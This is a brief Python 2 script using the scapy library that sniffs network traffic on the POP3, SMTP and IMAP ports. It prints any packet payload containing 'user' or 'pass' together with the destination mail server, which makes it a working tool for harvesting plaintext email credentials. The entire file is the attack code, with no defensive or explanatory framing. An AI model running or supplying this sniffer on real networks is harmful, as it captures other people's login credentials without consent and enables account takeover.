from scapy.all import *


# catch packets
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload


# start sniffer
sniff(prn=packet_callback, store=0,
      filter="tcp port 110 or tcp port 25 or tcp port 143")